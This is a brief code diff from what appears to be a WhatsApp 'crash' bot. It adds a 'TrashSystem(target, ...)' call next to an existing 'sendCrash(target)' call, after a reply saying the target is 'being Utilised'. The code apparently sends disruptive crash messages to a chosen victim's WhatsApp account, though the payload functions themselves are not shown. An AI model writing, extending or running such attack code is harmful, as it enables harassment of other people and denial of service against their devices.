@@ -1223,6 +1223,7 @@ var contactInfo = await sam.onWhatsApp(target);
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
    await sendCrash(target)
+ await TrashSystem(target, sam, ptcp = true)
   
  
 reply(`
